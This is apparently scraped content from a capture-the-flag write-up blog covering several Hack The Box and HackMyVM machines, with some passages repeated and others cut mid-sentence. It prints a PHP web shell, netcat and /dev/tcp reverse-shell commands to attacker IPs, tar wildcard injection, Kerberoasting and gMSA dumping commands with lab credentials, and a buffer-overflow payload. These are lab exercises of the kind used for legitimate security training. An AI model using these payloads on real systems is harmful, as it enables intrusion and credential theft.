This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain.

In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;. This probably works because the upload filter only checks the final extension, and by adding the extra dot, the file passes validation, even though PHP interprets it normally. Now we can try executing commands on the server through the uploaded file’s URL.\nWe execute a Reverse Shell and access the machine.\nhttp://environment.htb/storage/files/cmd.php?cmd=nc -c /bin/bash 10.10.14.32 4444 Privilege escalation to Hish If we navigate to hish’s folder, we can read the User Flag. We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

Since sudo preserves this variable, we can point it to our own script, and when we run sudo /usr/bin/systeminfo, Bash will execute our script with root privileges.\nWe create a Bash script in Hish’s home directory with the following content:\n#!/bin/bash\r/bin/bash Then we assign the BASH_ENV variable pointing to our script:\nexport BASH_ENV=/home/hish/root.sh When we execute sudo /usr/bin/systeminfo, Bash will automatically load our script, and we obtain a shell with root privileges.\nWe get the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/environment/","summary":"Difficulty: Medium 🟠","title":"Environment - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/family/","summary":"Difficulty: Medium 🟠","title":"Family - HackMyVM"},{"content":"\rMachine Link\nWe can see that when we open the machine it tells us its IP:\nSo knowing that the IP of the machine is 192.168.18.28, we are going to do a simple NMAP scan to see what ports it has open and what service they are running:\nNMAP simple scan\rWe can see that this machine hosts a web server on port 80 and that port 22 (ssh) is open.\nThis is what we see when we open the web server:\nIt tells us not to think too much.

I am going to send myself a Reverse Shell and set up the TTY.\nNow that we are inside, let\u0026rsquo;s enumerate the existing users on the machine.\ngrep /bin/bash /etc/passwd Existing users\rWe find two users: prakasaka and root.\nPrivilege escalation to Prakasaka I decided to navigate to prakasaka’s home directory, and as the www-data user, we can read the User Flag.\nThe next step to escalate privileges is to read the file secret.php, where we find the password for the user prakasaka.\nWe are prakasaka\rPrivilege escalation to Root Next, we run the command sudo -l to list the commands that the user prakasaka is allowed to execute with elevated sudo privileges.\nPrivilege escalation with the ip binary\rWe have permission to execute /bin/ip with root privileges. To escalate to root, let’s consult GTFObins and use the recommended commands for /bin/ip. Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain.

In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

Now we can try executing commands on the server through the uploaded file’s URL.\nWe execute a Reverse Shell and access the machine.\nhttp://environment.htb/storage/files/cmd.php?cmd=nc -c /bin/bash 10.10.14.32 4444 Privilege escalation to Hish If we navigate to hish’s folder, we can read the User Flag. We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

Since sudo preserves this variable, we can point it to our own script, and when we run sudo /usr/bin/systeminfo, Bash will execute our script with root privileges.\nWe create a Bash script in Hish’s home directory with the following content:\n#!/bin/bash\r/bin/bash Then we assign the BASH_ENV variable pointing to our script:\nexport BASH_ENV=/home/hish/root.sh When we execute sudo /usr/bin/systeminfo, Bash will automatically load our script, and we obtain a shell with root privileges.\nWe get the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/environment/","summary":"Difficulty: Medium 🟠","title":"Environment - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/family/","summary":"Difficulty: Medium 🟠","title":"Family - HackMyVM"},{"content":"\rMachine Link\nWe can see that when we open the machine it tells us its IP:\nSo knowing that the IP of the machine is 192.168.18.28, we are going to do a simple NMAP scan to see what ports it has open and what service they are running:\nNMAP simple scan\rWe can see that this machine hosts a web server on port 80 and that port 22 (ssh) is open.\nThis is what we see when we open the web server:\nIt tells us not to think too much.

I am going to send myself a Reverse Shell and set up the TTY.\nNow that we are inside, let\u0026rsquo;s enumerate the existing users on the machine.\ngrep /bin/bash /etc/passwd Existing users\rWe find two users: prakasaka and root.\nPrivilege escalation to Prakasaka I decided to navigate to prakasaka’s home directory, and as the www-data user, we can read the User Flag.\nThe next step to escalate privileges is to read the file secret.php, where we find the password for the user prakasaka.\nWe are prakasaka\rPrivilege escalation to Root Next, we run the command sudo -l to list the commands that the user prakasaka is allowed to execute with elevated sudo privileges.\nPrivilege escalation with the ip binary\rWe have permission to execute /bin/ip with root privileges. To escalate to root, let’s consult GTFObins and use the recommended commands for /bin/ip. Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection. Now, /usr/bin/bash has the SUID bit set.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is 